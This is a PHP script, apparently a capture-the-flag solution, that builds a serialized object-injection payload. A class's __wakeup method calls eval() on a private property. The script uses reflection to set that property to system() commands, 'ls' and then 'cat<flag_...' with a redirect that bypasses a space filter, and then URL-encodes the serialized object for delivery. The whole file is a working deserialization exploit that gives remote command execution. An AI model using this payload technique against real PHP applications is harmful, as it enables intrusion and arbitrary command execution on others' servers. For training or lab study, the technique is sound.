<?php

class secure_check {
    private $func;

    function __construct() {
        $this->func = '';
    }

    function __wakeup() {
        eval($this->func);
    }
}

$obj = new secure_check();

// use reflection because the func is private
$reflection = new ReflectionClass($obj);
$property = $reflection->getProperty('func');
$property->setAccessible(true);

#$property->setValue($obj, 'system("ls");'); # with 'ls' we find the files( we want to find a file starting with flag_ )
$property->setValue($obj, 'system("cat<flag_2BcdCF87f45A77350a65CbDEdc7ccAc0");');  #  now that we found the file, we have to 'cat' in order to find the flag ( we need to use redirect because there was a problem with spaces)

// serialize the object
$serialized = serialize($obj);
var_dump($serialized);

$url_encoded = urlencode($serialized);

echo $url_encoded . "\n";

?>

